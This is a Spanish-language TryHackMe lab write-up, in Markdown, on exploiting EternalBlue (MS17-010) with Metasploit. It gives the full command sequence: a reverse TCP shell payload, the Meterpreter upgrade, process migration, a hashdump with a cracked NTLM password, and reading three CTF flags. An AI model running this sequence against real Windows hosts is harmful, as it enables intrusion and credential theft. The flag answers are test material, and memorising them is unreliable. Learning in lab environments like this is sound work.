
# 🛠️ Práctica de Explotación: EternalBlue (MS17-010) con Metasploit

Este documento recoge paso a paso cómo exploté la vulnerabilidad **MS17-010** (CVE-2017-0144, EternalBlue) usando **Metasploit Framework**, como parte de la ruta *Cybersecurity 101* de **TryHackMe**.

> 🧪 Esta práctica se realizó en un entorno seguro y controlado, exclusivamente con fines educativos.

---

## 🔍 Objetivo

- Explorar la vulnerabilidad EternalBlue mediante el módulo de Metasploit.
- Acceder a una shell y convertirla en sesión **Meterpreter**.
- Extraer hashes y leer archivos tipo "flag" en la máquina comprometida.

---

## ⚙️ Pasos realizados

### 1️⃣ Acceso a Metasploit

```bash
root@ip-10-10-83-188:~# msfconsole
msf6 >
```

### 2️⃣  Búsqueda del exploit

```bash
msf6 > search ms17
msf6 > search eternal
```
Resultado:
```yaml
0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
```

### 3️⃣ Selección del exploit y configuración
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.40.187
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

###4️⃣ Conversión de shell a Meterpreter

```bash
c:\windows\system32 > background
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 post(...) > show options
msf6 post(...) > show sessions
msf6 post(...) > set session 1
msf6 post(...) > run
msf6 post(...) > sessions
msf6 post(...) > sessions -i 2
```

###5️⃣ Interacción con Meterpreter
```bash
meterpreter > getuid
meterpreter > ps
meterpreter > migrate 1312   # proceso spoolsv.exe
```


### 6️⃣ Extracción de hashes

```bash
meterpreter > hashdump
```
Resultado
```bash
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```
🔓 Crackeo del hash en crackstation.net
NTLM Hash: ffb43f0de35be4d9917ac0cc8ad57f8d
Contraseña: alqfna22


### 7️⃣ Lectura de archivos importantes (flags)

📁 Flag 1
```bash
meterpreter > pwd
c:\windows\system32
meterpreter > cat flag1.txt
```
Resultado
```bash
flag{access_the_machine}
```




📁 Flag 2
```bash
meterpreter > cd ..
meterpreter > cd ..
meterpreter > cd windows\system32\config
meterpreter > cat flag2.txt
```
Resultado
```bash
flag{sam_database_elevated_access}
```


📁 Flag 3
```bash
meterpreter > cd ..
meterpreter > cd ..
meterpreter > cd ..
meterpreter > cd Users
meterpreter > cd Jon
meterpreter > cd Documents
meterpreter > cat flag3.txt
```
Resultado
```bash
flag{admin_documents_can_be_valuable}
```






